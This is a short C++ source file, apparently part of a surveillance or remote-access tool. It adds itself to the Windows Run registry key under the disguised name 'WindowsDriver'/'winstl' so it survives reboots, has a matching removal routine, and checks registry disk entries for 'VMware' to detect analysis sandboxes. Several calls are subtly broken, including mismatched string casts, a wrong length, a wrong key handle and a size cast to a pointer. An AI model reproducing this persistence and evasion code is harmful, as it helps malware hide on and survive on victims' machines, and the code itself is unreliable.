#include "sys.h"
#include "stream.h"
#include "screen.h"

int Sys::AddToRegistry() {
  std::wstring fullPath;
  WCHAR dest[0xFFF];
  GetModuleFileNameW(nullptr, dest, MAX_PATH);

  HKEY hkey = nullptr;
  LSTATUS retRck = RegCreateKeyEx(HKEY_CURRENT_USER,
								  reinterpret_cast<LPCSTR>(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDriver"),
								  0,
								  nullptr,
								  REG_OPTION_NON_VOLATILE,
								  KEY_ALL_ACCESS,
								  nullptr,
								  &hkey,
								  nullptr);
  if (retRck != ERROR_SUCCESS) {
	return retRck;
  }
  LSTATUS stat = RegSetValueEx(HKEY_CURRENT_USER,
							   reinterpret_cast<LPCSTR>(L"winstl"),
							   0,
							   REG_SZ,
							   (LPBYTE)dest,
							   (fullPath.size() + 1) * sizeof(wchar_t));
  return stat;
}

int Sys::RemoveFromRegistry() {
  HKEY hkey;
  LSTATUS retRok = RegOpenKeyEx(HKEY_CURRENT_USER,
								reinterpret_cast<LPCSTR>(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
								0,
								KEY_ALL_ACCESS,
								&hkey);
  if (retRok != ERROR_SUCCESS) {
	return retRok;
  }
  LSTATUS retRdk = RegDeleteValue(hkey, reinterpret_cast<LPCSTR>(L"winstl"));
  RegCloseKey(hkey);
  return retRdk;
}

bool Sys::CheckForVirtualMachine() {
  HKEY hkey;
  char lszValue[256];

  RegOpenKeyExA(HKEY_LOCAL_MACHINE, R"(SYSTEM\CurrentControlSet\Services\Disk\Enum)", 0L, KEY_READ, &hkey);
  RegQueryValueA(hkey, "0", lszValue, (PLONG)sizeof(lszValue));
  RegCloseKey(hkey);

  return strstr(lszValue, "VMware") != nullptr;
}

